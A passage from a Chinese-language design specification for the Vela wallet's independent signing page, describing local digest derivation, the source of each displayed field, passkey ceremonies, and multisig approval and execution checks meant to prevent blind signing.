`vela-relay`，Docker 与 Cloudflare Worker 两种部署）。

---

## 8. 摘要从哪来

**签名页只签自己算出来的摘要。** 谁能提供摘要，谁就能让你签任意东西，上面那张卡
就退化成装饰。`lib/digest.js` 从渲染同一份意图重新推导：

| 方法 | 摘要 | 状态 |
| --- | --- | --- |
| `personal_sign` | EIP-191：`keccak(0x19 ‖ "Ethereum Signed Message:\n" ‖ len ‖ msg)` | 已实现，对上权威向量 |
| `eth_signTypedData*` | EIP-712：`keccak(0x1901 ‖ domainSeparator ‖ hashStruct)` | 已实现，对上 EIP 原文例子 |
| `eth_sign` | 载荷本身就是摘要 | **拒签**（那就是盲签） |
| `eth_sendTransaction` / `wallet_sendCalls` | Safe 4337 的 SafeOp 哈希 | 已实现，与 vela-core 的 wasm 逐字节一致 |
| 钥匙仪式（第 10 节） | 本页自己生成或自己取来核对的挑战码 | 已实现；请求方带挑战码 = 拒签 |

**消息类还有一层**：Safe 不验裸的 EIP-191/712 哈希，EIP-1271 验的是把它包进
`SafeMessage(bytes)`、用 **Safe 自己的域**再算一遍的结果。所以 `context` 给了
`account` + `chainId` 时才包；没给就明说「未包 SafeMessage，Safe 不会认」。

### 8.1 交易要带上整笔操作

SafeOp 哈希覆盖的是**组装好的 UserOperation**，不是站点请求的那一笔调用。所以请求方
必须把操作交出来：

```json
"context": {
  "chainId": 1,
  "account": "0x88cC…6894",
  "operation": {
    "userOp": {
      "sender": "0x88cC…6894", "nonce": "0x7",
      "initCode": "0x", "callData": "0x7bb37428…",
      "verificationGasLimit": "300000", "callGasLimit": "200000",
      "preVerificationGas": "110000",
      "maxFeePerGas": "1500000007", "maxPriorityFeePerGas": "1500000000",
      "paymasterAndData": "0x"
    }
  }
}
```

而签名页做两件事，缺一不可：

1. **渲染的是这笔操作自己的 calldata** —— 解开 `executeUserOp(...)`，
   遇到 delegatecall MultiSend 就再拆成逐笔。屏幕上的数字和摘要覆盖的字节同源。
2. **核对站点请求的那一笔调用确实在里面**。组装过程中被换掉收款方 → 直接拒签
   （`refuse.opMismatch`），并且屏幕显示的是**操作里的真实收款方**，不是站点声称的那个。

EntryPoint / 4337 模块地址若不是 Vela 的那两个，会挂一条 danger —— 不自动拒，
但绝不让它悄悄过去。

---

## 9. 屏幕上每一样东西的来源

「所见即所签」不是口号，是一张可以逐项对照的表。`samples/hostile-test.mjs`
把请求方能控制的每个字段填成毒串，然后断言它们不出现在渲染结果里。

| 显示的东西 | 来源 | 请求方能改吗 |
| --- | --- | --- |
| 金额、代币、收款方、逐笔明细 | 从**被签名的 calldata** 解出 | 否 |
| 意图（「兑换」「存入」…）与它下面的**来源行** | ✓ 本页从交易读出（无 calldata 的发送、本页按链认识的代币上的 ERC-20/721 标准函数、消息）/ △ 「由本页自带的 <合约> 说明描述 —— 只是描述，不是保证」（协议描述符，**只绑在它写给的合约与链上**）/ △ 函数名来自公共数据库 / △ 「看起来像 <x> —— 只看形状，未经核实」（同样形状打在别的合约、别的链上：意图是「合约调用」，按钮是「签名」，参数按类型原样列出）/ ○ 请求方的说法（盲签时唯一的读法是它的模拟）。描述符不说明合约诚实（2026-10-28） | 否 |
| 金库存入的资产 | 描述符为**它写给的金库**写明（sDAI → DAI）；`context.vaultAsset` **不使用**，别处同形状的存入按最小单位原样显示（2026-10-28） | 否 |
| 「去向不是本账户」 | 兑换的收款方、金库的份额 / 资产去向不是 `userOp.sender` 时一条 danger；最少换回几乎为零（≤ 一个整币的百万分之一）时一条 danger（2026-10-28） | 否 |
| 已知合约的名字 | 本页的表，**按链**（同一地址在别的链上是别的合约或什么都没有）；只有确定性部署的（Permit2、Safe MultiSend、CREATE2 部署器）在所有链上（2026-10-28） | 否 |
| 「现有额度」（increaseAllowance） | App 的 `currentAllowance`：给了才算「之后的额度」，那一行标「App 的说法」，句子写「App 说现在是…」；没给就说本页看不到（2026-10-28） | 是，且标明 |
| 网络费（金额/代币/收款方） | 从 calldata 里的**费用腿**读出 | 否 |
| 「这一笔是网络费」 | App 的标注（`feeLegIndex`） | 是，网络费旁标「App 标注」 |
| 法币金额 | 本地 = 数量 × **请求方给的汇率**，汇率同时显示；每个法币数旁标「按请求方给的汇率」。币种只认 ISO 4217 代码（`USD`），别的文字一律不显示法币（2026-10-28） | 只能改汇率，且看得见 |
| 原生币的币名（金额与网络费） | 本页目录按 **chainId** 查（金额、网络费同一条规则）；`nativeSymbol` 只用于本页不认识的链，且在金额、网络费、网络行都标「币名由 App 提供」；App 没给就写「?」，不猜 ETH（2026-10-28） | 是（未知链），且标明 |
| 「本账户」标签 | 只给签名所属的账户：交易时是 `userOp.sender`，消息时是 SafeMessage 包裹用的账户；`context.account` 单独说了不算（2026-10-28） | 否 |
| 随 calldata 一起转出的原生币 | 从**被签名的 calldata** 解出，单独一行粗体金额 + 一条提示，批量的每一腿都有（2026-10-28） | 否 |
| 签名摘要 | 本地推导（EIP-191 / EIP-712 / SafeOp） | 否 |
| 链名 | 由 **chainId**（在摘要里）本地查表；未知链才用 App 给的名字并标「App 提供」，且网络行总显示「链 ID <id>」；App 也没给就只写链 ID | 是（未知链），且标明 |
| identicon | 本地由地址算出，与 vela-core 逐字节一致 | 否 |
| 账户地址 | 交易时即 `userOp.sender`，在摘要内 | 否 |
| **账户名字** | 请求方（或本机注册记录） | 是 —— 它的作用是**指向该用哪把 passkey**，改不了钱的去向 |
| 站点名 / 图标 / origin | 请求方 | 是，且始终挂「站点身份由请求方自述」。名字就是主机名才作页头；否则页头是「未知站点」+ 主机，名字作为它的自称写在下面（`source: 'vela_browser'` 谁都能写，不算证明；2026-10-28） |
| 文字里看不见的字符 | —— | 方向控制符、零宽字符在消息和名字里显示成 `[U+202E]` 这样的码位，并加一条提示；被签的仍是原文（2026-10-28） |
| 模拟结果 | 请求方 | 是，标注「模拟由请求方提供」，技术细节里的摘要同样标注；**不降低**解不开的调用的风险，也不再说「站点伪造不了」（2026-10-28） |
| **收款方的名字** | —— | **不显示**：这是最容易被投毒的一项 |
| 代币符号与小数位、网络名 | 本页的目录（`lib/catalog.js`，由 vela-core 的表生成），按 chainId | 否；不认识的代币按最小单位原样显示整数 |
| 「确认方式：这台设备」 | 钱包给的 `keyRoute.place` | 是 —— 它只决定浏览器去哪里找钥匙，答复照旧要是账户的钥匙 |
| 页面版本 | 本页**地址**里的哈希 | 不是请求方能改的；也不是证明（证明是钱包打开前的核对） |
| 预渲染的费用字符串 | —— | **不使用** |
| 请求方给的摘要 | —— | **不使用** |
| 多签批准（第 12 节）：safeTxHash、域哈希、消息哈希 | 本页从**原始 SafeTx 字段** + chainId + 多签地址本地算出（EIP-712）；App 给的 safeTxHash 只用来比对，不一致就拒签并把两个哈希都写出来 | 否 |
| 多签批准：读法（转账、成员变更、批量的每一腿、拒绝、改名） | 本页按 vela-core `review` 的同一套规则从 SafeTx 读出（`lib/multisig.js`）；对外部合约的调用走交易的同一条阶梯（描述 / 4byte / 只看形状 / 盲签） | 否 |
| 多签批准：多签的名字 | App（`context.multisig.name`）| 是，且标「App 提供」；看不见的字符显示成码位 |
| 多签批准 / 执行：成员变更的「之前」（成员数、门槛） | App（`context.multisig.owners` / `.threshold`，第十轮）；「之后」从 SafeTx 读出。本次操作部署了多签时以核实过的 setup 为准 | 是，且标「App 的说法」；对不上变更就不写数字、给一条提示 |
| 多签批准 / 执行：「谁的钱」 | 本页：多签的交易里授权、转账、随调用转出的原生币都写「多签的」（第十轮）；`selfTag` 只由本页设置 | 否 |
| 多签批准：被签的字节 | 本页推导：`SafeMessage(safeTxHash)` 在**成员**自己的域下 | 否 |

---

## 10. 钥匙仪式：创建、登录、证明（075）

请求仍是 `{id, intent:{method, params, origin:""}, context}`，所以通道不需要新信封。
`context.walletName` 是钱包的名字（显示在卡上，它是人认出自己钱包的方式；不可读或超长则不显示）。

### 10.1 四种请求，以及每种怎么守住「只签自己推导的」

| `intent.method` | `params[0]` | 本页签的挑战码 |
| --- | --- | --- |
| `vela_createPasskey` | `{name, excludeCredentialIds, place?, hints?}` | 本页生成的 32 个随机字节。注册本来就不证明任何挑战码，别人的字节没有理由进来 |
| `vela_signIn` | `{place?, hints?}` | UTF-8 `vela-signin-<毫秒>-<16 位十六进制>`：本页的时钟 + 8 个随机字节 |
| `vela_proof` | `{credentialId?, purpose, place?, transports?, hints?}`，`purpose` = `verify` / `recover_first` / `recover_second` | UTF-8 `vela-verify-<毫秒>` / `vela-recover-<毫秒>`（各端原生流程的同一格式） |
| `vela_memberProof` | `{credentialId, publicKey, attestation, groupPublicKey, registry, chainId, registryContract, place?, transports?, hints?}` | 本页**在本地算出**：`keccak256(abi.encode(chainId, registryContract, rpId, publicKey, keccak256(abi.encode(groupPublicKey, attestation))))`。`chainId` 与 `registryContract` 由钱包给（发布页连不出网络，076）；本页只签自己算出的这 32 字节，钱包把答复和它自己从注册表取来的挑战码比对，对不上就拒（`expected_member_challenge`）。两样缺一 = 拒签（`refuse.noDeployment`） |

`place` / `hints` / `transports` 见下面 10.4。

- 文本挑战码永远不是 32 字节，Safe 不会把它当操作哈希。成员挑战码是 32 字节，但它是对卡上
  显示的输入、按固定 ABI 布局算的 keccak —— 没人能挑出一组输入让它等于某个 SafeOp 或 EIP-191 哈希。
  这个推导与线上注册表逐字节对过（`samples/member-challenge-vectors.json`）。
- 默认注册表 `https://p256-index-v2.getvela.app`；`registry` 只接受 https，或本机回环上的 http。
- **请求方想自带挑战码 = 拒签**：`params[0]` 里有 `challenge` / `digest` / `hash` / `message`，
  或 `params` 不止一个，或 `context` 里有 `challenge` / `digest`。在任何 passkey 提示、任何注册表
  请求之前就拒。
- 所有仪式 `userVerification: 'required'`；创建：ES256、可发现凭据、`attestation: 'direct'`
  （保留 AAGUID 给注册表的 20 字节 attestation）、`user.id = UTF-8(name ‖ 0x00 ‖ uuid v4)`
  （和各端一致，登录时钱包能从 user handle 读回名字；名字超过 27 字节时改用 16 个随机字节）。
- 指名了 `credentialId` 的仪式，若回答的是别的钥匙，签名丢弃、不回传。

### 10.2 谁可以请求

**创建钥匙**和**成员证明**只接受 Vela 钱包发来的请求（成员证明会把一把钥匙写进公开的注册表，
和创建同样要紧）：

- App 通道：回环 WebSocket（一次性 token）、隧道（`rk` + 比对码）、BLE（邻近 + 比对码）；
- 或浏览器背书的 origin（postMessage、扩展端口）是 `https://getvela.app` / `https://*.getvela.app`，
  或本机回环（开发与测试时网页钱包跑在这里）。

URL 片段本身不算（任何网页都能用它打开本页）；url 通道上算数的是答复地址：恰好是
`velawallet://sign-result` 才放行，否则**每一种**仪式都拒（规格 102 R7）。请求方在
`context` 里写的 `channel` / `requester` / `originVerified` / `callback` 一律被通道自己的
事实覆盖。postMessage 上，登录和证明对其他请求方也显示，但挂一条
「这不是 Vela 钱包发来的请求，请求方会知道你挑了哪把 passkey」。

### 10.3 答复（字段放在信封顶层）

```
创建:  {v:1, t:"result", n, id, registration:{credentialId, attestationObject, clientDataJSON, authenticatorAttachment, transports}, origin}
仪式:  {v:1, t:"result", n, id, assertion:{credentialId, signatureDer, authenticatorData, clientDataJSON, userHandle, authenticatorAttachment}, origin}
postMessage:  {vela:"result", id, registration|assertion, origin}
```

- `credentialId`：base64url，无填充（和签名答复一样）。
- 其他字节字段：**小写十六进制，不带 `0x`** —— `attestationObject`、`clientDataJSON`、
  `authenticatorData`、`signatureDer`（WebAuthn 原样返回的 DER，不是 r‖s）、`userHandle`（没有时为 `null`）。
- `transports`：`getTransports()` 用逗号连接（如 `internal,hybrid`），或 `""`。
- `authenticatorAttachment`：`platform` / `cross-platform`，或 `""`。
- `origin`：本页的 origin，仅供参考；钱包核对的是 clientDataJSON 里的 origin。

钱包（vela-core 的 `verify_registration` / `verify_ceremony`）在使用前核对每个答复：类型、origin、
挑战码的格式（成员证明要和钱包自己取来的相等）、指名的钥匙。

### 10.4 钥匙在哪里（规格 102 R5）

`params[0]` 里的 `place`（`platform` / `hybrid` / `security_key`）和 `hints` 是人在钱包里
选过的位置；`vela_proof` / `vela_memberProof` 还带那把钥匙的 `transports`。本页据此：

- 创建：`authenticatorSelection.authenticatorAttachment` = `platform`（这台设备）或
  `cross-platform`（手机或平板、USB 安全密钥），加 `hints`；
- 登录：不指名钥匙（可发现凭据），只加 `hints`；
- 证明、成员证明：`allowCredentials` 是指名的那一把，带 `transports`，加 `hints`。

没给这些字段（旧钱包）就和以前一样，由浏览器自己问。

## 11. 会话：一个通道，多个请求（075）

回环 WebSocket、postMessage、隧道、BLE 上，一个会话按顺序承载多个请求（创建 → 成员证明；
恢复第 1 步 → 第 2 步），钱包每个流程只打开本页一次：

- 答完一个请求，页面回到平静的「等待钱包」，继续等下一个 `intent`；
- 结束于：钱包的 `bye`、通道关闭、或空闲 5 分钟（页面发 `bye`，`reason:"idle"`）。
  卡还在屏幕上、等人看的时候不算空闲；
- 会话里被本页规则拒掉的请求**立刻**答 `refused`，理由留在屏幕上直到下一个请求；
  一次性通道（URL 片段、扩展）仍是「关掉页面才发拒绝」；
- 关掉页面时屏幕上若有未答的请求，照旧答 `user_rejected`（或 `refused`）。

## 12. 多签成员的批准（`vela_multisigApprove`，2026-10-29）

> 2026-10-30 起，第 12.3 节的通道与答复规则是**每一种签名**的（第 13 节）；本节其余部分只讲多签批准自己的请求与核对。

创始人的 Bybit 教训：**签名人必须能在一个独立于钱包 App 代码的界面上审阅并签名。**
多签住在网页钱包里。成员账户的「签名方式」选了签名页时，批准（发起并批准、批准、执行前执行者
自己的批准、拒绝 = 批准一笔取消交易）不再弹钱包自己的 passkey，而是交给这一页。

### 12.1 请求

```json
{
  "intent": {
    "method": "vela_multisigApprove",
    "origin": "",
    "params": [{
      "chainId": 5042002,
      "safe": "0x…多签",
      "member": "0x…批准的成员（本机的 Vela 账户）",
      "safeTx": { "to": "0x…", "value": "0x…", "data": "0x…", "operation": 0,
                  "safeTxGas": "0x0", "baseGas": "0x0", "gasPrice": "0x0",
                  "gasToken": "0x000…0", "refundReceiver": "0x000…0", "nonce": "0x3" },
      "safeTxHash": "0x…App（vela-core）算的，只供比对"
    }]
  },
  "context": {
    "chainId": 5042002, "chainName": "Arc Testnet", "nativeSymbol": "USDC",
    "account": "0x…成员", "signer": { "name": "Bob", "letter": "B" },
    "allowCredentials": ["…"], "keyRoute": { … },
    "multisig": { "name": "Arc Team", "owners": ["0x…", "0x…", "0x…", "0x…"], "threshold": 2 }
  }
}
```

`owners` / `threshold`（第十轮）：多签**现在**的成员与门槛，钱包取自提案所对的链上成员（vela-core
`PasskeyPurpose::Approve` 的 `owners` / `threshold` → `ApprovalInput`）。本页连不出去、核实不了，只用来把成员变更
写成前后（「成员 4 → 5 · 所需批准数 2 / 4 → 1 / 5」），标「App 的说法」；地址不合法、重复、门槛超出人数 = 没给；
与变更对不上（加已有成员、删不在的成员、变更后门槛超出人数）= 不写数字、挂 `warn.msMembersClaimOff`。没给就照旧只写门槛。
执行（12.7）的 `context.multisig` 同样带 `owners`；本次部署了多签时以 setup 为准，是事实。

由 vela-core `trusted_signer::approval::request` 生成（网页钱包经 wasm 的
`trustedSignerApprovalRequest`）。字段名与 vela-core 的 `SafeTx` 相同；数量是 `0x` 十六进制或十进制字符串。

### 12.2 本页做什么（`lib/multisig.js`，不信任 App）

1. **严格读字段**：地址必须 `0x` + 40 位十六进制，数量必须是字符串、不超过 2^256−1，`operation`
   是整数，calldata 超过 64 KiB 或批量超过 64 腿就拒签（「太大，无法完整显示」）——本页把每一个字节都画出来，
   一个能让页面卡死的请求就是一个拒不了签的请求。
2. **自己算哈希**：域哈希 `EIP712Domain(chainId, verifyingContract = 多签)`、消息哈希（SafeTx 结构哈希）、
   safeTxHash。和 App 给的不一样 → `refuse.msHashMismatch`，最先、最响地写出两个值，不弹 passkey。
3. **按核心的规则读**（vela-core `multisig::review`，`samples/multisig-test.mjs` 逐例对拍发布的 wasm）：
   原生币 / ERC-20 转账（金额按本页目录里的小数位，不认识的代币按最小单位原样）、对外部合约的调用
   （交易的同一条阶梯，来源行照旧）、成员变更（加、删、替换、改阈值）、改名、拒绝（取消）、
   MultiSendCallOnly 的每一腿。**拒签**：对 MultiSendCallOnly 以外的 delegatecall、批量里的 delegatecall 腿、
   发往零地址的腿、多签对自己做成员变更以外的调用（`enableModule` / `setGuard` / `setFallbackHandler` /
   `changeMasterCopy` / `execTransaction` …，卡上写出函数名）、带 gas 退款的交易、未知操作类型、向登记合约转币、
   显示不全的新名字。
   **与钱包的唯一审阅对齐（2026-10-30，第五轮整合）**：钱包签成员批准之前走 vela-core `multisig_review`
   （§3.6：读法 + 状态差异守卫 + 收款方风险，`signingGate` 在每次 passkey 前重读链）。本页连不出去，状态差异守卫
   只能靠读法规则；规则是**本页拒的 ⊇ 核心审阅拒的**：`multisig-test.mjs` 把每个 SafeTx 都送进不带链上读数的
   `multisigReview`，核心拒（`sign.allowed = false` 或无法审阅）本页必拒；核心的状态差异向量
   （`tests/vectors/multisig-review/`，Bybit：一个写 slot 0 的 delegatecall）本页从字节上就拒。
   链上读数才看得出的未声明写入（例如一个已启用的模块被调用后改了成员）由钱包在开页**之前**拦下
   （`authorizeSigning` → `SigningBlockedError`，页不会被打开）。
4. **签什么**：`SafeMessage(safeTxHash)` 在**成员**自己的域（`EIP712Domain(chainId, 成员)`）下 ——
   v1.4.1 的 Safe 对每个成员调用旧版 `isValidSignature(txHashData, sig)`，Vela 账户的
   CompatibilityFallbackHandler 核对的正是它（vela-core `approval_challenge`）。不是 dApp 的 SafeMessage
   （那条多一次 keccak）：两者永远不能互相冒充。哈希用的是**本页算的** safeTxHash，从不用 App 给的。
5. **卡上有什么**：标题（转账 / 合约调用 / 添加成员… + 「多签」标签）、来源行（✓ 本页读出 / △ / ○）、
   多签（地址 + identicon，名字标「App 提供」）、网络、读法、nonce、三个哈希（全文，各带复制按钮）、
   签名成员与确认方式、按钮「批准」（取消交易是「批准拒绝」）。

### 12.3 通道：postMessage，只答网页钱包

网页钱包收不到 `velawallet://`。它用 `window.open` 打开**核对过的那一版**
（`…/b/<hash>/sign?ch=post&lang=…`，vela-core `CheckedPage::post_launch`），等本页说 `ready`，
再把请求发过来（7.1 的信封：`{vela:'intent', id, intent, context}`）。答复 `{vela:'result', id, result}`
（`result` 与交易签名相同：`credentialId`、`signature`、`authenticatorData`、`clientDataJSON`）或
`{vela:'error', id, code}`。

**答复只交给 Vela 自己的钱包**（`resolve.answersToWallet`，R7 的扩展）：postMessage 通道上，只有浏览器报告的
打开者 origin（`event.origin`，不是请求方的说法）**恰好是**下面之一，且请求是钱包会交来签的那几种
（`eth_sendTransaction`、`wallet_sendCalls`、`personal_sign`、`eth_signTypedData_v4` / `_v3` / `eth_signTypedData`、
`vela_multisigApprove`）时，才算交给钱包：

| 打开者 origin | 是谁 |
| --- | --- |
| `https://wallet.getvela.app`、`https://getvela.app` | 网页钱包 |
| `chrome-extension://bjbdmnmpgcfkocfcfdocopkioacojkhl` | 已发布的 Chrome 扩展：`extension/manifest.json` 的 `key` 推出的 id（开发包与 GitHub 发布包都带这个 key）。Chrome 应用商店给商店包分配自己的 id（商店包不带 key），**分配后才加进来**；在那之前商店安装的扩展签名页拒签（答 `refused`），钱包那边照样说「签名页没有签」 |

`*.getvela.app` 的其他子域不算，别的扩展 id 不算，`eth_sign` 谁来都拒。本页自己在本机回环上时（开发者自己的页面，
只能用回环自己的 passkey），回环上的钱包、以及任何未打包扩展（`chrome-extension://<32 位 a–p>`）也算。其余一律拒签；
`lib/intake.js` 在发出那一刻再按同一规则查一次，不合格的只收到 `refused`。

**钱包转来的站点是钱包的说法**（2026-10-30）：打开者是钱包、请求里的 `origin` 却是别的站点时（扩展转来的 dApp 请求），
浏览器背书的是「谁打开了本页」，不是「哪个站点发起的」。卡片照旧写站点的主机，但不当作已核实，挂一条
「是哪个网站发起的，是钱包的说法」（`warn.relayedOrigin`）—— 本页存在的意义就是不信任可能被篡改的钱包界面。

### 12.4 钱包怎么验（vela-core `trusted_signer::approval::accept`）

只接受：user-verified 的 `webauthn.get`、挑战码**恰好**是钱包自己算的批准字节、凭据是该成员的钥匙之一、
P-256 签名在那把钥匙下成立；再组装成 `PasskeyApproval`，并按链上的方式验一遍（`verify_approval`），
且它的 owner 就是这个成员。页面说自己签了什么，一个字都不读。

### 12.5 网页钱包开页之前的核对

和各 App 一样（规格 076 / 102 R6）：取部署的 `index.json`，核心选版本（`launch::target`），以浏览器导航的
`Accept` 取**那一个 URL** 的字节、算 sha256，核心裁决（`launch::admit`）；不通过就不打开，卡上写核心的那一行。
浏览器只在托管方允许时才把跨源的字节交给脚本，所以 `dist/_headers` 给 `/b/*` 和 `/index.json` 加了
`Access-Control-Allow-Origin: *`（字节本来就是公开的，核对不带任何凭据）。没有这一行，网页钱包的核对永远完成不了，
也就什么都打不开。

### 12.6 测试

- `node samples/multisig-test.mjs` —— 与发布的 wasm 逐例对拍哈希、批准字节、读法（36 个 SafeTx，核心自己造的
  转账 / 调用 / 成员变更 / 取消 / 改名 + 手写的敌意形状），并对拍钱包的唯一审阅 `multisigReview`（核心拒的本页必拒，
  含状态差异守卫的七个向量），再走本页的管线：哈希不符、名字里的看不见字符、
  超大载荷、非钱包的打开者、链和成员对不上，十五种语言。
- `bun samples/answer-test.mjs` 的 G 段 —— 发布出去的字节上：evil.example 用 postMessage 要多签批准 → 拒；
  `wallet.getvela.app` 要 → 卡上有多签名（标 App 提供）和三个哈希，点按后答复回到钱包，签的正是批准字节；
  哈希不符 → 拒、不弹 passkey；网页钱包要别的签名 → 仍拒。

### 12.7 多签的执行（第七轮，r7-1）

执行是执行者**自己的**用户操作（vela-core `execution_calls`），网页钱包按钱包自己的发送交来（`wallet_sendCalls`，`origin` 为空，
组装好的整笔操作与费用腿下标）。操作里有 `execTransaction` 的腿时，本页把它当作一次执行来读（`lib/multisig.js` `execution`），
读不全就拒，绝不画成一串盲签：

1. **`execTransaction`**：只认核心的编码（`exec_transaction_data`：十个头字、data、signatures、之后什么都没有），不带币、CALL；
   里面的 SafeTx 按 12.2 的同一套规则读（`read`，拒签照旧：MultiSendCallOnly 以外的 delegatecall、gas 退款、改模块 / guard …）。
   批准从签名字节里数（`v = 0` 合约签名、`v = 1` 发送者或链上批准，`r` 为成员；27/28/31/32 为普通钱包的 ECDSA）。
   接管拦截（`takeover`）对这一腿只查目标是不是执行者自己 —— MultiSendCallOnly 的批量正是 12.2 允许的。
2. **部署多签的腿**：`createProxyWithNonce` 打在 Safe v1.4.1 工厂上、L2 单例，setup **正好**是 Vela 建多签的那一个
   （成员、门槛、CompatibilityFallbackHandler、没有 setup 钩子、没有付款 —— 本页重新编码逐字节比对），CREATE2 推出的地址就是被执行的多签。
   别处建的多签（Safe{Wallet} 的 genesis）在它的第一次执行里部署：本页无法担保它没写的 setup，拒签。
3. **部署成员账户的腿**：同一工厂与单例，setup 正好是一个 Vela 账户的（`vela_account_genesis`：从 setup 自己的 MultiSend 读出钥匙、
   重新编码比对，salt nonce 是钥匙的哈希），推出的地址是一位在签名里批准了的成员。
4. **别的腿**（又一笔调用、第二个执行、核实不了的部署）一律拒（`refuse.msExecExtra` / `refuse.msExecDeploy`）。

`execTransaction` 不带序号（多签用自己的）。钱包在 `context.multisig` 里给 `{address, name, threshold, nonce, safeTxHash}`
（vela-core `approval::execution_context`，wasm 在 `vela_multisigExecute` 的请求里加上）：地址与被执行的多签不符 → 拒；本页按
这个序号从字节重算 safeTxHash，与钱包的不符 → 最先、最响地拒（`refuse.msHashMismatch`）；序号、名字、门槛都画成 App 的说法；
本次部署了多签时门槛是事实，与钱包说的不符 → 拒。钱包没给（旧版本）→ 照样读全，不显示哈希，写一句为什么。

测试：`node samples/multisig-test.mjs` 第 3 段（核心自己的 `genesis` / `velaAccountGenesis` / `deployCall` / `signatures` /
`execTransactionData` / `executionCalls` 组装；36 个 SafeTx 逐个执行与 `multisigReview` 对拍）；钱包一侧
`sign-challenge.test.ts`（执行请求带 `context.multisig`）。

## 13. 签名页处处可用：网页钱包与 Chrome 扩展（2026-10-30）

创始人 2026-10-30 定下：账户的「签名方式」选了签名页，**网页钱包与 Chrome 扩展**也把签名交到这一页，和三个 App
一样 —— 取代 2026-09-23「网页版不支持可信签名器」及 2026-10-29「只为多签批准」（规格 102 plan P2-11 / D-16）。

### 13.1 谁去哪里：核心的一条规则

vela-core `signing_venue::signing_route(plan, kind)`（wasm `signingRoute(record, method)`）：每个 shell 都只问它。

| 账户的签名计划 | 交易 / 批量 / 钱包自己的发送 / `personal_sign` / typed data / 多签批准 | 钥匙仪式 |
| --- | --- | --- |
| 被挡（自建域名账户、本机不知道它的页） | `blocked`，带核心的理由 | 同左 |
| 签名方式 = 在 Vela 里 | `in_vela`：Vela 自己的界面与 passkey | `getvela.app` 账户在 App 里 |
| 签名方式 = 签名页（官方页，或自建域名账户自己的页） | `page`：那一页 | 自建域名账户在它的页上（R3） |

`eth_sign` 和不认识的方法没有 kind（`SignatureKind::of_method` 为 `None`）：签名方式是签名页时网页钱包直接拒，
绝不在 Vela 里替人签。

### 13.2 网页钱包与扩展怎么交

1. 核对页面（R6，和多签批准同一段代码 `app-web/vela-wallet/src/lib/signing/page-handoff.svelte.ts`）：取 `index.json`，
   核心选版本（`BUILD_ALLOWED` 里 index 列出的第一个），按浏览器导航的 `Accept` 取那一个 URL、算 sha256，核心裁决；
   不通过就不打开，卡上写核心的那一行。
2. 交接卡（规格 102 D4）盖在签名界面上：确认方式、哪一页、完整性那一行、「继续到签名页」。点按打开
   `…/b/<hash>/sign?ch=post&lang=…`（`CheckedPage::post_launch`），页面说 `ready` 后发
   `{vela:'intent', id, intent, context}` —— 请求是**核心造的**（wasm `trustedSignerSignatureRequest` →
   `trusted_signer::request`：方法、参数、组装好的整笔操作与费用腿下标、账户、钥匙路线）。
3. 只听自己打开的那个窗口、页面自己的 origin。答复 `{vela:'result', id, result}` 只按核心的方式接受
   （wasm `trustedSignerSignatureAccept` → `trusted_signer::accept_signature`）：核心从**它自己造的请求**算出摘要
   （交易 = 那笔操作的 SafeOp 哈希；消息 = EIP-191 / EIP-712 哈希包进账户自己域下的 `SafeMessage`），这串字节必须
   就是钱包接下来要签进签名里的字节，否则 `wrong_challenge`；再要求 user-verified 的 `webauthn.get`、Safe 验证器
   的 client-data 规则、账户自己的钥匙、P-256 签名成立。页面说它签了什么，一个字都不读。
4. 结果：签了 → 照原样继续（交易去 relay，消息组成 EIP-1271 签名）；人在页上拒绝或关掉页 →
   dApp 收到 **4001**（核心的 `SignSubmitOutcome::PageDeclined`；钱包自己的发送则当作关掉 passkey，确认界面留着重试）；
   页面按自己的规则拒 / 答复验不过 / 页面 30 秒不说 ready / 核对不过 → 界面上一句「签名页没有签」，什么都没签；
   请求在扩展里过期或站点离开 → 按规格 082（4900，由 worker 答）。
5. **第七轮**：核对页面最多 20 秒（`CHECK_MS`），过了就是「签名页没有回应，请再试一次」（r7-2），不再无限「正在核对页面…」；
   没签的原因按核心的一个结果说（`SignSubmitOutcome::PageFailed`：没回应 / 答复与这笔请求不符 / 页面拒签 / 核对不过），
   站点收到 -32603 和页面的原因，消息签名永远不说「交易无法提交」（r7-7）。钱包放弃请求（超时、请求没了、答复验不过）时
   先对页面说 `{vela:'bye', reason:'withdrawn'}`，页面撤下按钮、写「已撤回」（r7-5）；答复被接受后钱包说 `bye` `done` 并关掉
   这一页，页面自己也会关（S4）。

### 13.3 扩展：请求在页面打开期间一直活着

扩展的请求窗口 / 侧边栏就是钱包本身，交接一样。页面打开期间钱包每分钟再 `claim('sign')` 一次；worker 的
`claimVerdict` 让一次 `sign` 认领续上前一次 `sign` 认领（五分钟从最后一次认领算，`deadlineOf` 本来就这么算），
content.js 收到 `claimed` 就把页面那边的期限往后推。认领被拒（站点离开、时限已过）→ 关掉签名页，什么都不签。
一个窗口一个钱包（`one-surface.js`）不受影响：签名页不是钱包页。

### 13.4 测试

- `bun samples/answer-test.mjs` 的 R、G、H 段：规则本身（网页钱包、已发布扩展的 origin 被答，子域、别的扩展 id、
  不被浏览器背书的、`eth_sign` 都拒；转来的站点是钱包的说法）；网页钱包要一条消息 → 签了、答回去；子域 → 拒；
  **一个真的未打包扩展**带着已发布的 manifest key（所以就是已发布的 id）打开发布出去的那一页 → `personal_sign`、
  `eth_signTypedData_v4`、`eth_sendTransaction` 都签了、答回扩展；另一个 key 的扩展 → 拒、不弹 passkey。
- 钱包一侧：`src/lib/signing/sign-challenge.test.ts`（每一种签名交到页、核心接受的答复、错的字节 / 错的钥匙 /
  页面字节不对 / 别的窗口与 origin 都被拒、页上拒绝与关页、请求没了就关页）、`e2e/extension-signing-page.e2e.ts`
  （扩展 + 本机 TLS 上的 `dist/`：签名方式在设置里选签名页，dApp 的 `personal_sign` 与 typed data 在页上签、关页 → 4001）。
- 核心：`signing_venue` 的 R7 测试、`tests/trusted_signer.rs`（`digest_of`、`accept_signature`）、
  `tests/app_sign_request.rs`（`PageDeclined` → 4001）、`tests/signing_venue_102b.rs` 第 7 节。

### 13.5 Safari 扩展（iOS，原生审计 §6.5，2026-10-31）

同一份扩展代码打成 Safari 包（`app-web/vela-wallet/extension`，`pnpm build:extension:safari`），由 iOS App 的
Safari Web Extension 目标装进 Safari。iOS 26.2 模拟器上实测的三件事决定了这一节：

1. **扩展页不能做 passkey。** `safari-web-extension://` 页面里 `navigator.credentials.get({rpId:'getvela.app'})`
   直接 `SecurityError: The requested RPID did not match the origin or related origins`（Chrome 的「持 host 权限即可
   认领 RP」在 Safari 不存在）。所以 Safari 上的签名只能在本页（或 App）里完成。
2. **扩展的 origin 是 Safari 编的。** `safari-web-extension://<UUID>`：每次安装、每次 Safari 重启都换（同一台模拟器上
